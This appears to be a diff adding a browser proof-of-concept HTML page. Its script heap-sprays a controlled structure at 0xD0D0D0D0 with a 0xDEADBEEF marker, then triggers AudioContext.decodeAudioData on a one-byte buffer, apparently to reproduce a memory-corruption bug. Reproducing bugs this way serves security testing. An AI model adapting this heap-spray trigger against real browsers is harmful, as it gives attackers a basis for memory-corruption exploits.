@@ -1,0 +1,30 @@
+<!doctype html>
+<html><head>
+<script>
+  function cStructureHeapSpray(uBaseAddress, uSize) {
+    var uHeapSprayBase = 0x80004000;
+    function fuAddressToIndex(uAddress) {
+      return (uAddress - uHeapSprayBase) / 4;
+    };
+    var oThis = this,
+        uArraySize = fuAddressToIndex(uBaseAddress + uSize),
+        adwHeapSpray = new Uint32Array(uArraySize);
+    oThis.fSetDWord = function (uOffset, uValue) {
+      adwHeapSpray[fuAddressToIndex(uBaseAddress + uOffset)] = uValue;
+    };
+  };
+  try {
+    var uStructureAddress = 0xD0D0D0D0;
+        uStructureSize = 0x1000,
+        oStructureHeapSpray = new cStructureHeapSpray(uStructureAddress, uStructureSize);
+    oStructureHeapSpray.fSetDWord(0x24, 0xDEADBEEF); // d0d0d0f4
+  } catch (e) {
+    // already allocated
+  }
+  location.reload();
+  new AudioContext("notification").decodeAudioData(
+    new ArrayBuffer(1),
+    function(){},
+    function(){}
+  );
+</script></head></html>
